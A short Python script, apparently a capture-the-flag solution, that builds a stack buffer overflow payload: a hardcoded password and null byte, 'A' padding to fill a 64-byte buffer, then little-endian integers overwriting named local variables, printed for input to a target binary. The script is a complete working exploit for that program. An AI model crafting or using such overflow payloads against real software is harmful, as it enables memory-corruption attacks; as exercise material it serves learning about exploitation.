# Initial password to pass the check
initial_password = b'kalki2898AD'

# Null terminator to end the string
null_terminator = b'\x00'

# Calculate the padding to reach the start of local_c (64 bytes total for local_68 buffer)
padding = b'A' * (64 - len(initial_password) - len(null_terminator))

# Overwrite the variables in order
local_c = (100).to_bytes(4, 'little')
local_10 = (0xFA).to_bytes(4, 'little')
local_14 = (200).to_bytes(4, 'little')
local_18 = (0x32).to_bytes(4, 'little')
local_1c = (100).to_bytes(4, 'little')

# Combine all parts to form the final payload
payload = initial_password + null_terminator + padding + local_c + local_10 + local_14 + local_18 + local_1c

# Print the payload as a string
print(payload.decode('latin-1'))
